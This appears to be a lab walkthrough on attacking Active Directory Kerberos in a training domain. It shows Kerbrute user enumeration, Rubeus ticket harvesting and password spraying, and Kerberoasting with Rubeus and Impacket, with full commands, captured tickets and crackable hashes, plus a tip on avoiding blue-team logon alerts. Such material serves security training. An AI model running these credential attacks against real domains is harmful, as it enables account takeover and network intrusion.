# Attacking Kerberos

**Kerberos** (the windows ticket-granting service) can be attacked in multiple ways:

- **Kerberoasting**
- **AS-REP Roasting**
- **Pass the ticket**
- **Golden/Silver Ticket**
- and so on.

## Introduction

###  Kerberos authentication overview

Since Windows Server 2003, Kerberos is the <u>default authentication protocol in Active Directory</u>.

> The key idea behind Kerberos design is to prevent the use of fake credentials and to mitigate various network attacks.

![](img/kerberos-auth-overview.png)

> For more details, read this [article from HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberos-authentication).


### Terminology

Abbreviation     | Term                      | Definition
-----------------|---------------------------|---------------
**AS**           | Authentication Service    |
**KDC**          | Key Distribution Center   |
**SPN**          | Service Principal Name    |
**TGS**          | Ticket Granting Service   |
**TGT**          | Ticket Granting Ticket    |

![](img/introduction.png)

___

## Enumeration w/ `Kerbrute`

`Kerbrute` is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

```bash
echo "10.10.135.137  CONTROLLER.local" >> /etc/hosts
```

> **Note**: By brute-forcing Kerberos pre-authentication, you do not trigger the account <p style="color:#dc3410";>failed to log on event which can throw up red flags</p> to the <p style="color: #1092dc">blue team</p>. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

```console
root@kali:~/thm/attacking-kerberos# ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/29/21 - Ronnie Flathers @ropnop

2021/06/29 17:17:49 >  Using KDC(s):
2021/06/29 17:17:49 >   CONTROLLER.local:88

2021/06/29 17:17:49 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/06/29 17:17:49 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/06/29 17:17:49 >  Done! Tested 100 usernames (10 valid) in 0.449 seconds
```

___

## Harvesting & Brute-Forcing Tickets w/ `Rubeus`

`Rubeus` _(developed by [HarmJ0y](http://www.harmj0y.net/blog/))_ is an adaptation of the [kekeo](https://github.com/gentilkiwi/kekeo#kekeo) toolset. It can be used for a variety of attacks such as bruteforcing password, **password spraying**, **overpass the hash**, ticket requests and renewals, ticket management, ticket extraction, harvesting, **pass the ticket**, **AS-REP Roasting**, and **Kerberoasting**.

### Harvesting tickets

- Harvest for TGTs every 30 seconds:

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>.\Rubeus.exe harvest /interval:30  

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal)        
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (6/29/2021 8:35:28 AM) 

User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  6/29/2021 8:29:17 AM
  EndTime               :  6/29/2021 6:29:17 PM
  RenewTill             :  7/6/2021 8:29:17 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEmdvHjkRAbLtKCupY1woKK9Llgz2ileRPz7g
    +mDEHBQ9JpIsxdZSxRah6KW6jgT6/JaxlNHRmdo1NuHY9fESCYc7Hzq4kgmikPjGNioSqW+TwaZGA3Hj4bq6XnoAmrA0ne7kKNET
    qJBLgdwebcUjPK/+GmxXwjWgqk2SahEWbzr6nJyg5CJ9IGCJ1v34i4gK9o4cnnpxAdkVbtM0EQQsAymx6srwAIm2uBTGYUI2tlgO
    +wuVclPF+scfxEH9Ys8qjd/Fj888hcL40LpEwKgipNdYochB8JtddyJT/l13xC0LCVeckuF4EML99LMXnu4cdlRCgOw7riltq8mK
    5VxCI8AsIJYCrXf2Cpl9mtZo9jScFr36Vr9qHrwe2oMD4kALiI5u2UmFO2w+s6eWqB8Qtxcvs0p4fgYhxSdUY9OfvYbp+jhxwLfq
    o0+uP4NhXMUUQrx66jss995AAh0kLiezB3GHMrdWGbwFyM69GtJ6E25tpTQRWZEV1NWKm0jWRCsC24qbDtiGPHJ7BrUgVoDzD2V3
    Pw1ANh2P54giuHI/bqsbv2c/VHRyOr7VIbfPqnjmRiLFhK5v1+IxjX8KMHCLB0bQ3MQcZeArQxr5/NLJflCvY0MWyAoRfmUPAdgb
    Mb9+Xb8lvZk3xK2C0ttfDEmOvZkYl+zGSHEEFBf8J73GynKrPEBuIwbYXV6Mn9A9g0UWda0Wyvm5J8i/If7lmTszh8x+VWUGKfsX
    O3MX4l1geo28lzW+0N7BntrRc9iEj7dcdwZI3AJxDQvJNY6lPVXtKYa4KzB5/rg6cRrFxyu/zlxmPCmNfirI3fuVK7coLe4oy/jn
    AaPtKQao2hUJNV6/V4c/9iWjNpmZbxM2ElQhVfE5TSRATsGVPPKKhwyBumZ9yJpYhxQ261TzFawu3cMbQ3SAnmWIL2u+U3cRNp/W
    AzxRSSeGzZ3HsA+Q9fjoXAV3jvmJ1M5rS5WExHuUP+Dl1n0NA9RgLvl46p2Xs305fWQ+I/Yw1QZZHmj1oyqUZSDe0DJyYs6+rvhB
    sEPCl1A+e6HIeWMSCQezTY+zHUlDcRcbo2NyL4FDJi1fad2vObQtLXKlajaGNLIkQXs59o9wEdLCK2qk2+UY4gYDsOO0K6Fkv6l2
    D185vPBy6Ur8YaVhp6gfDTu25vLRBVqgNZ2rnxX88m1PcDjxvWlyNly4IquaLLGTzSEK/WhGs1R5uTNtUMrAK8pQZKKgSPDqDzNS
    K9OnkfE1Ef3Y2FirY2aT1HcTllcLTXbHph2u9tvQyz86vM3gEu2uHkMFQxDgFqsNbl8MW7mT1/c8rQfYJMc7/Jvb32Vhgn2EAiez
    CTplu4RTXSoCA6Mt++zZ/pCRJsuslAlerFhGr0c/lsfC4sCFSQ/lv4+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBo/FUoM1flNxmreK8eJA83icVDX3uO3mmtKCjTeNNyjKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDYyOTE1MjkxN1qmERgPMjAyMTA2MzAwMTI5MTdapxEYDzIwMjEwNzA2
    MTUyOTE3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  6/29/2021 8:23:09 AM
  EndTime               :  6/29/2021 6:23:09 PM
  RenewTill             :  7/6/2021 8:23:09 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGmT7VabFNFCKPCQv8oWX6WFDFInbQ3yQP45v
    Qpqth8HdwoG5IG8bVqY0yJ7Myc5O9u/JsRciohcQ4YuFHYmMDNOcDYkf4DR7ugrVah+8+kjykZYFAUk9x4D29EZ3y5u8Zu5I4HuE
    LTUkq3whclttk5I7k3Bz1Z7Reg/HttkPTrXq1LTMOvXMhtdU4Jt+h+Qs2J33rqyvKlHQnUFIAvRnzhOF/IHtW6HuEFvS5woO1IVM
    7k9aPS3vZk2Na3sTPuQk2ItecSjLPCBO9wA3tt7i7dN2iNlJD38Jr50aZBC3rzkS92eiXAnMMz53hZgbGnyeCso1CEIYcEUF7mkz
    J2kbDc558bz3E3WhxV7w/guE7hTq7jC2mQK9ND00j2+QhBva2A/uvqu0T0CQjgiPtqmEDN4HagWQEXSIoplUH9wbwmNC0ySz4Qcy
    /vcE4v6z2bGLL8S9a+lPuHGndCbr5TLxkPL0ss/3Dboq9gUNtoj5cUOF+jud314PrxtDKIQAp34lgvRpeJEG9/tUyZspyIg6J8/H
    5exmBa1Ln4hFeujNV7kOLbxylV6/Cy6UWfjWvf1ndftwnYD9ciTRQcP5l1PiOdxkrteH+4pJ8RccT4+2Z/GHR06Giuer2wkHKhZx
    1RAEWCDJuulKkKatHB90zydhsjHm5amZbsxBMkhyq7a5tEjd5qzx3yyf3eBq9FuoDV2vJ5kQmaxPndsVeub50TeuK6cPG7F8T+tx
    27CL0MUTev8Wix+GJnxZg+7Pzmgf5pfikI0QicRvsbQZLYS01LsZc9doffXARUHsbWqi712b/uapr/aubY6/STzBMwPV//mKHEca
    bbd26M0IeGumWuUu30BRvnrfJWyF5P5tYmxv4/+PRVZXyHKU0M1fOx9QeMp/K+KQ7zYhnKbGh/HRNkdBfZ/bf7/GzjiTsOrv1ddF
    XEsQfsvySOy+cCWj9YjpVxam4eh6OnpohYx4mrlVFQ0+t79ZQ+EMw5I1MExao1cOw8lYWWU2aB6yYW80OdEmH69rUY5zTgulB1oO
    UU81kWBMWJB3Qp2pYl2xQNKkPiALIvA5imdEc0OQH0n/1fVXnnSS6ldKw+XWNQV9i9/IlGxeYK/xio4gT97qN581o4nZ+K5imziQ
    FZJejnZ+2clNMs15opvT+EBNxtGzPgT/91x4DJprYyePjWH71ojHAiPwVSG6Y7v0Mo776S/0YAyzKlvMjDt+Tpo9qpfF1vsNjIZM
    TTq7JywUWD2ZjWkfEapeU44OqL/FgV2BtL+BWSIQ/rg72cP8nbx2vV9B82mm1zpeRGl160vGrSGeIwP/HZ49v4cJfE9WZUTJ52QD
    99Es9VVORDmb1ebzKYSBiQPUVwDd/ivSP51+uoN+nsOIjjLMr9mg3ReBXYhe+8dW+qOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEID51zHt+MlCjfRFfb3s1wpMbS+Ey+Zv9eNReu6jGw6vhoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwNjI5MTUyMzA5WqYRGA8yMDIxMDYzMDAxMjMwOVqnERgP
    MjAyMTA3MDYxNTIzMDlaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=
```

### Password spraying

When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. 

In **password spraying**, you take a given Kerberos-based password _(such as `P@$$W0rd`)_ and "spray" against all found user accounts in the domain to find which one may have that password. 

This will result in a **.kirbi** ticket (a TGT) that can be used in order to get service tickets (TGS) from the KDC as well as to be used in attacks like the pass the ticket attack.

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>echo 10.10.135.137 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7X5jDNej2iF5f1pJiq0CyaD/RNnxz3MLWVY0/KlZceZruw9O6eN4gptAKWdIbP1B8+FiBERdxF6R
      hSzgQLpd6buWMjZzY165bGBpGK9Dd3t989gboqKvD1wXon7I4CVFnaEW8TnSyUauPdMFYft8V+ilE7Kt
      M5C9PI9TSPJyaUkTOS0NZvqiNrWBuD4qq8rtQERSQADejaMfQibusIj4WkycUUxvMC4wXsAIMoEBD9YM
      Ta2ZJgBrbiZ98Gkg3nyHl4YQ0QK+wEYiN7T+/MPc6PLkijsMNsHVG41OmokxfKv3vXqmWdLqIScm7z2f
      5VB4q+MhrxL8RupeE5s2Q++mGtnuyyUHxaMHg7pwRsGuxAASAF6KfIGNMjoO82i7ui+1//8EEF7SstZX
      OOqh4wlSRdup5Xh8AxOj0u9Tzgw3ivIreqVP7VXtpRhwnvPrf3cENbNs4ENiCyIfVCWVXAnKYAnkf7gf
      WyTUEnODw0dP9MlHGglN6d8rrZWk9jEWISvInmgk+MrnXeALRwF8q134idvz3v2DxF5aULdM4HV02xIo
      VEY51+I4gxaTlEkuQsVPiJtcQeiuyX6OITsl4F6bkKd2OVIIQ1LdITDMJzuoIqbGM+kpuOEODBTctLRd
      7i6dsihQ+bZf6TWi6NJ4f/ZPDd9dTOOtjVaQvi3NlCjMBcZtsuRgC53ieiGq7/54P6ZqE5InZZK1mllM
      Gg2bryfL5uOyQu0mMfuXO7ZrhSqLoRiojF3KS/aTXOWT68GjmUQ+zLNmFcGjSz7gctroHxdz9SRiQezy
      KwnGMa8ijzvkrFuUiO0y2m7TicWigN795b30pmwBA38qN6DR5h9B1aiBoiSO8AuKRLnajMZXIfh95RUd
      78UCuOSF09MsDc5ipPlqoIpo3SvNzqGikeeIt4GSkV9Nfx5NbWXSvOoOz5slLtE0uivrrbmOzxydqkRE
      Y8215pLrqap/gUBuC7UcYszbUWQQpz4oRpzSrKhRECEar78AHaPEEoSNxNdbT991JJJF4IBbyQNLnKzG
      K5ZgQrsMNUW2hWDDVfhuFtAi4UwNoWyxWZDyeWnkq8/btVYx+XlaQsK0vO4TfIgCPPuXiEWWSWxQhQwO
      FN3NW5mzdvGMtPLS4qdzZuzx7FWTpLfQWFTMOKhbSuMDDYueVls/kexouBiZTB8zZ3+QQ+dmJUCwFUzu
      98CQyvuv5iDOzP5bsRxhSXlfvD6Dm+rIjL9jntbFwYyj588vpegMVaznikdmEJAumOHRrQgHBqBRhR5V
      al2bgh0y00Lo8zCjqy+c5CiQp+YFJi3+JeQIGKsqV2h4+cbhrxKIlnQqExawZJtpQKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKhyMZpMwU215u2/yya0NkPY1pJq3H9mhIzm
      fyqKZST1oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDYyOTE1NDYxMVqmERgPMjAyMTA2MzAwMTQ2MTFapxEYDzIwMjEwNzA2MTU0NjExWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

___

## Kerberoasting

**Kerberoasting** allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

### Method 1: using `Rubeus` (local)

- Dump the Kerberos hash of any kerberoastable users:

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 


[*] Action: Kerberoasting 

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
                                                                             
[*] Searching the current domain for Kerberoastable users                    

[*] Total kerberoastable users : 2 


[*] SamAccountName         : SQLService                                     
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$C1FB84AE1BCCD689EC61B42D94D99353$72D8CAEF2F50BF8BB9B5B5AB19F264DD335B2B 
                             11E708D0C82796DA03558CD3F741A400384415D8A0495538E0765C274898810127B55DC702FA7A15 
                             BADA61BA29D0F47620B05A2F20B6CDB19C62491947089784AA31461D48616619712EA405A08471A5 
                             D5F39E3D09C1834D19BC6943200B9E85C6FB1C9B9D22C449DB2C0E70A74A612A3922A832A06BF170 
                             3F755CB991925565A1C43F0654756ABDB11D4036CC4C29F8D035CD6029A4033FEC627ADA2CAC77B5 
                             CBD9337DB419E59099D1F6D8FCDF083BD51696ADCED0338A5F91F756A3CEF5F8EDBBEF2F437413C8 
                             3CC74E6EBC6CF9B5BB129E312DA4CE0B563E1BBF7FF09612FC74DBB7C72DDD660C13DB28AEF0E56C 
                             A6990232DEFA5B8B635ED1C8016FAEFAA2EB9A86689A8CDF33854B40CF7048E01AD967B462CCD014
                             D6B6BD3ABF576C932317555F714426D611AE0E609F2356F9E185A47AFD57107DEAFE2F90DF392B11
                             B8F8DB5A5D88EBBAE8852EDA3B9C093C69336B4C7DC4E102C1A02ECF61BE0C142F8CFAAFB34E510E
                             B099D1B73DBA76328B5C1E8DB71F2B01AB10D64616D28CE75B47629263601DB87F86C1DC859C4965
                             491AE7D2ABBF0950648D8E67D3AE2D3B814366A391E69DA90E59B2190C2B1AD0BADD45B4F08D5461
                             42EF1FAD3563ADAB83069D670182716E3F5DB6E1C5F0E03030D21843C5955E1531363F5FFD922B78
                             D64C96484BC4533A95F525505AA3C786DCEAC96C95A2A50C38E9A539D498AB21AD19F06DD45CD1AA
                             7DE1DF9C9B9DB9E61C2FED8F58CBB74B56222CCFF2FF71FC15FEF428510C810C80A65C442BAEFA8D
                             4E22691707974B4F3BA71FAFF821D9440D0CD0DD19E275E75420D487871C355B7C2F1C19ACAE069D
                             82A9D8B65F608A908BF5A696BB51B979A2786DEC2BEE0034CEC53FE83DC0DB2D521D61024670D102
                             D1D9F8C8ADFEADD3828641FBE4FD4C1117C18784400A739C80D2A7B6BB8FA0826579F1B16437B6AC
                             EB83AE0DB603F3BE0222FCB6A6FE972E4584FCEEF9092BCF27C3655658245B3AABA8D964458E8851
                             A4121D18518AF1EDD41906FB2A0A678D0BC857ACB806477D5E1F93EEDE0A4226EAB661764510FB84
                             13929DE78960F10A63EBF740F0CDADCF49BFA4B626CD6BC8CB3EE7983C275A3B8992B3E275EBA2E0
                             29257B473D03C6EF3B770829B5050A8612A748E94C10E0379C7F37032158098CC43E17F1A6CA1B53
                             2A1D708673BEA1DAB38A7F9CB340C8A69E951428FDAB9BC361EDA89A36D6EAC9E607FC35E908B9C9
                             1CEAA5F1487AC5D769B53311363CB31B8FE00EE2495FC302DA93CC6259E375B03696B8F102D1FE6D
                             28D34ADC46BCF852BDF230BC432B9EB4A1084B643ADF7AF3E8D609BC5649E1105911063B984F5B5B
                             EEDC695A2F6A09A61C17F329E48AFC28D659EDE5457C4B36AB7B25EAB22B90BB6D6EC737FDCBAFC0
                             FD4D3327F63D5235D857D9CF3C9E4B710E6B0469284C706A1BBEAF8F6764D54DF55C46A9F74E4696
                             80BDD72BB417DD35B97D9404D8F940468EA48CAC7B70760CECA9C4DEF10355280A216FC42ADB7288
                             8E813FF85992DFFF864311D8E8B04D91DAA0EC609B9C514BFE55CCAA87AC5E119381B3C40938AF56
                             4ADF948EAC3E4F1190418432CCC8180B903604C2A13FE6D9D2598448E4


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$8401DB8764A32AAAB50F27DC889D5366$21887B5332B73F6B6E41701003B0C1086B7E
                             A560EBA743B07AEA779806B0729DE6D7988AF4A93036E5530141677FCC8A6E7B3B7E905078A00082
                             090A46874705A8923FEE7304DD5A09B229AB008395E7A2946FDE5545B11F965419D973172FF4A570
                             AC05190C002E4C0D04D585748322BE2160671CAC44B4AF0F568190B908FE38E5634F37FC0AEFEC8D
                             6521AF741B3D9346EE2A9996E5271D431DDC5BAB3F77C10DA5FF888BDECEA7290666A0D8BA1CDCF3
                             BA51C0A4D32731A12FD84D34A836A59BE79F749279E90F1B5C67F24AD3CF76F2136793845B978B66
                             9D80831403A18EBB4777B20AE61C0AE34214E71E213526D8FF2B9050B9313BFFA177ED0656109CE7
                             B6CA08566C79CBC77032101D22DF2FD266288327992C1FC51BF4E52BB75046690E92A02489A3D4D7
                             BDCEA822D8622DAA29991F3828D6A3B0AE11B9CAE58EAE2A54E5ACF7D1FA101E40F1D72D08522A5C
                             5D55B0EEACC7455ED0E81D489DEC8C0F3EFEF747937A6CF8356F52F138D8A791E4B6576744D1FC18
                             832B43028ECDBA57E14E6D8F6B7438F31C0BDD3AA6E40BC09EDCF105D821F765AE26E5008F9EED97
                             1BFABEE78AA56662FA7EA8939F857AEBE732D8C7E1F9AA7D79F51FAA99782173B25580923BD65906
                             70BADEA63F2A670AF22F006DD8CA079CE444CA9F0B4EF606BEB907D3C0709E9CD079085025837130
                             D9DD735EB91BE6B8036C608E579E46896CD05A0F822D81600A32AD77A6293CC1D98439CA259A8520
                             7F573D07C0E557E0A28224505F24E0384AD8305A8D1108C6FBBB20BA5E994E36342051C1EB62AB24
                             90A0E5F4A815D55E59FEC26A80D132321E4D0A492763F7949AFE9D3A6EE52FB47E2B784668749E5B
                             7F6A112CBA21006BFBA4335E1AA70C7696C4321C5810979FD2209191CA773F4A2D1F3A9B884BBDE8
                             98AD6B323C519D51D351A31E757950BA202D1202241C562CFDF6B0AFBBCB25D31BF1F71123162ACB
                             52C271DF39A72CB27F189577B604410B54E46EA3214AD4E8C2770A19D51A6B33383F92AE1F532AB2
                             55513630E27428178354A62A68715397711E0F8D8A0B3DA3C95B38B8F7B631E1715A439D6F394829
                             2ED52640FC05CDFE66A2B212BA431C9C2AE55451ECD9B0592A3190F081391B8B68EA0CC669A19A0D
                             77F7693D61D0E20D46208BBDFD14B4157D3DBE0F84F86E55C0C450E49815F00E8C85D5815BB0BD5C
                             8FAD7E30CD115ED1CFD6A6205FB0C6905C16645E53B32DF715802EBDC0A02DC74182ABF90BF49E57
                             EABB18185DA14EE8CA612AF030A8E465BF715AC3A421153151A78528B936A19155E312D0E51CF5C1
                             3296D44A2017C5F6E3D24034924A834DE33164C95B4578B56E1B1532F6A06FAD6F51CA03DAF965DA
                             8FA396734547638294E65CE4A5BA6AE45706A6AFB1892160DEEF7A5AAE1C2CDB8C3CEE93E2AE4D56
                             F80D52357D0C3619B00F5015A4DC130F56A91F9F13C3DCA2E1990AD807A850DF54CC211422C6D4EB
                             106078794B325045707DB89E98BA1B941A67F1C1295A0696A036FA86BB59DA3E760FBEDA271BE0ED
                             40295079A771F9C224E5F0118F54C6576294A5FFAFF5B9E619FA5D800F1BE272F77BCF1AD5A59C71
                             CDD8B9166986B55DB4ACD706BA66AD46BA66CE2A55C50F0272757BBD9934
```

### Method 2: using `Impacket` (remotely)

```console
root@kali:~/thm/attacking-kerberos# GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.135.137 -request
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 00:28:26.922527  2020-05-26 00:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 00:39:17.578393  2020-05-26 00:40:14.671872             



$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$4d15890a36dde47beab3a832fb4cc2b9$155f9293736bf74296b26ba4c434231b973aed178db5edf7f9f5ff301618e6f312ef2237aaaa3b570189e5a310eebdd40500f7e96502d18ab2f0a85ccf8c33cb7b252eb0ffa984368df566afc4eec1da00a8d060f57d87d7ace33e443bfb1be1813c34b042614621b39ad6bff805bfea3dc7c344ab5db262dd6fa2c3af8ef1051f9a140bcb7eed77e54c496cc07017596f5a09e9d7b40aae924baa2391d6483d796a32befcff34a8e3d013f27b75a1f5640ec5082bce5ae3657f37438f834ad1d394e60fb18c8558f5140774832dd3c1d8e5f3cfb4a22c4ee2976d989d67fb7cc289991b1f055479cc88449225fbc8fd7515407b14ee0e9ad179b6cb6ca7545e65b4d2b1ee57e12d80642f1f007493b9d96371559b56cfb62a35acc801ae4ca2565cfd55ca4ef91c9121e298b575719f6f41f42f60d7ebf1282c43263fb96dba3d07cd578aaa41210a787dec9066582cab7d13ea887803c1b29a8c6128fb7b7804ef6b42d220a700f267238d263d88d1b5fb38a6ad191cadf5969271e600f9e9e07ebd9fb4b427bd2ba1bc010e200a2a85c97d4702d17191cf7023788f7938f0ecfa1382bd5e4dbb086cf1ed53862e9a9e84c6fa340df05761059d8e8f92b414bb30a1c15c93f92bcbf7d7dae797282c616a6b31bbe136d3fd7d4253e4af257a9977ace8008a106829bc7b0ade5909d4a9b1a3ec306b95e7bbced14799c0b9675bc252d4e1ed20ca42327a587dadd1edd248fdebb0b1d2aad4604e6822ef5127ecb7d4abd2f72420f162c1a25b6043ffb2a1c8b62f1a8bf78568dd403c725827d7f3d2e8453eb21385bdd1b9d1257c48b4e946422ef8b578028fa4b7aec3bd33bc5ee5b265191c94c57c47019c7fdf8011c01e06b46a24c3f21b1ba17ba7cbd7b876c0fb83467530c8529bbb855f5a868ba1519849ee9c97cc3456a5412d8a20b5b60336db361b38ddf0681e1749cfc0766a2640fc877629a8cb84c03a5dc63e4649ffc83af919e6307026dc61ac23df1c16466933e3a3acd136946b2359a60553255fc3f32da9991f5fc6d97c0656220f660ea576c434e5e30b9a5dda0df1b9094ed2c4f8ca184bd1ef31a96db97e218cbeebace0c14d6d6d92662d7222ef48ae02cc33f9ec38f9992a5ef72a24b90787f4802cf364124e4a1c25ddec5f22d0f5dd29f303182e99732a129fb5c77f7af82ffa10b1685d814462ad09fa65c17a958b6ca60fa73ff858b0e315020a662cb27d99ed2984431910aa4c6258b9d7050c8dff72dffa0960ddd8541f0a0933bcfe93403439ea938a40b3c8d41a11a45e1ba93c0e5de4c9dc81f4cfb47fcc2e892d1e5b1868a00b1a6e6360046aae9d11d9d9cdecfb190fceae1ca3df654de190fb
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$ec9862c299884035e696537b24e10eeb$53723dc0ca8ffc479b92b7139b96d90e72800baffa1d10c5ef6b3351e2b9a6ce12b385555b8777a289a769623a3c3659907e344f4dea5aa750b806ff3e6ebfdd938fa4fe14e555be46eec324d99debe93f51ac6c5fe491091835a466383858b327894d504487d6596f0bfe758cc047e9076a3f9b941288a5e141fa05362fcb47d6073b684c34ae3c31f61de6826113f40328a2e3315e5ba5661c392289d18c819a3c5aec151ec8c60ac81dd33844b1c1c2407f376ef23ed05feb59ee7e1259c87455f6d4696fd02770bcb5fb78fcf9000a84b76286e28600ce81ed1a78b95d3c15cba33d863ae23a39d4b45344200bf194f49afb5f828040189f66244f6d4b7c27ff090aeeecec1b4f7132e95581ff85ad10a279f522415dfbe6518251c4a166c66309f93f9cef5aa85e7044d06b3cbf95d51ce3fc5998fcaf23613db05f6e22fc9651998191f67f56fd68a421b5e9225472e7cc58292e18358f81c4b06b743da9f3f8d32418c4d8cda6002341094d291c7b156d1b749028088eb4c79d7d9e1fdc2890d890f565151928f85c9a0957a58276519411c789b8277a7